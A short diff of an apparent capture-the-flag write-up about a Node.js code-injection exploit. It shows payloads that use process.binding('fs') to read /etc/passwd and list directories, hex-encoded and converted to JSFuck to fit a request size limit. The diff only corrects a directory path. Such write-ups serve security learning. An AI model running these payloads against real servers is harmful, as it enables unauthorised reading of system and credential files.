@@ -78,7 +78,7 @@ We cant send ```require``` because it is not defined. But we can use ``` process
 But we have strong restriction in node.js. We can send get request no larger than 80kb. And if we try to send ```buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer ``` coverted to JSFuck , it will be 93369 bytes. I tried somehow to compress it, but length was still >85000.
 
 The solution here is to use base64 or hex encode/decode and use ``` process.binding('fs').readdir('/')``` in js. Base64 will not work because there are a lot of letters in encoding , and they will be converted in larger pieces.
-Convert ``` d=process.binding('fs').readdir('/etc/', 0, 0600);d; ``` to ascii hex. We will get ``` 643d70726f636573732e62696e64696e672827667327292e7265616464697228272f272c20302c2030363030293b643b```
+Convert ``` d=process.binding('fs').readdir('/', 0, 0600);d; ``` to ascii hex. We will get ``` 643d70726f636573732e62696e64696e672827667327292e7265616464697228272f272c20302c2030363030293b643b```
 Convert ``` var a = new Buffer("643d70726f636573732e62696e64696e672827667327292e7265616464697228272f272c20302c2030363030293b643b", "hex").toString();b = eval(a.toString()); return b``` to JSFuck and we will get 47651 chars. If we send them, we will get responce 
 
 ``` HTTP/1.1 200 OK
